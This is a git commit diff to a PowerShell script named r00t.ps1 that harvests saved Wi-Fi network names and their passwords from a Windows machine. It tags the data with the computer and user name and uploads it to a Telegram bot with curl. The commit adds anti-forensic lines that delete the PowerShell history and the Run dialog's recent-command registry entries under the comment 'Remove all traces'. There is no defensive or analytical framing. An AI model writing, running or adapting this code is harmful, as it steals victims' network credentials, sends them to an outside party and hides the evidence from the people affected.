cbbedb7bfef533ef75c4d09c80a49c29a53bd331
deathesther <122229257+Esther7171@users.noreply.github.com>
2026-06-15 14:09:47 +0530

    Update r00t.ps1

--- r00t.ps1
+++ r00t.ps1
@@ -8,10 +8,13 @@ netsh wlan show profiles|Select-String 'All User Profile'|%{
     if($p){"$n : "+(($p -split ':')[1].Trim())}
 }|Out-File $f -Encoding UTF8
 
-$h="[r00t_b0t] $env:COMPUTERNAME | $env:USERNAME | $env:USERDOMAIN`n"+(Get-Content $f -Raw)
+$h="[r00t_b0t] $env:COMPUTERNAME | $env:USERNAME`n"+(Get-Content $f -Raw)
 $h|Out-File $f -Encoding UTF8
 
 curl.exe -s -X POST https://api.telegram.org/bot$tk/sendDocument -F chat_id=$ci -F document=@$f
 
+# Remove all traces
 Remove-Item $f -Force -ErrorAction SilentlyContinue
+Clear-History -ErrorAction SilentlyContinue
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
